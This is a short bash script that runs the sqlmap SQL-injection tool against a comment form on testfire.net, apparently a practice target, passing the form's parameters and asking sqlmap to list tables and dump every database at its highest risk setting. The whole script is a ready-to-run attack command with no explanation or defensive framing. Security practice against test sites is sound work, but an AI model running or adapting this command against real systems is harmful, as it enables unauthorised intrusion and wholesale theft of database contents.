#!/bin/bash

URI="http://testfire.net/comment.aspx?cfile=comments.txt&name=+asdf&email_addr=asdf&subject=asdf&comments=asdf&submit=+Submit+"

sqlmap\
	-u $URI\
	--tables\
	--dump-all\
	--output-dir="./sqlmap/"\
	--level=2\
	--risk=3
